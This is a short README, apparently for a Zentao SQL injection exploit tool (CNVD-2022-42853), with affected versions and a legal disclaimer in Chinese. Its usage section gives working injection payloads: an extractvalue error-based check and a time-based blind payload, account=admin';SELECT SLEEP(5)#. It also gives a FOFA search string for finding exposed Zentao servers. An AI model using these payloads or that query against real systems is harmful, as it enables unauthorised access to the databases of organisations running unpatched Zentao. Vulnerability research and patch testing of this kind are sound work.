# ZentaoSqli 禅道存在SQL注入漏洞 CNVD-2022-42853

author:160team.west9B


**仅限用于安全研究人员在授权的情况下使用，遵守网络安全法，产生任何问题，后果自负，与作者无关。**

# 01-基本介绍

漏洞编号

CNVD-2022-42853  公开日期：2022/6/14

影响产品

禅道企业版 6.5

禅道旗舰版 3.0

禅道开源版 16.5

禅道开源版 16.5.beta1

# 02-使用说明

## usage: ./Zentao.exe -u url  (加http://)

禅道当前数据库都是zentao,判断注入条件 extractvalue(1,concat(0x7e,(database()),0x7e) == zentao

盲注payload account=admin';SELECT SLEEP(5)#

# Screenshots
![Image text](https://github.com/west9b/ZentaoSqli/blob/main/POC.png)

# fofa
app="易软天创-禅道系统"

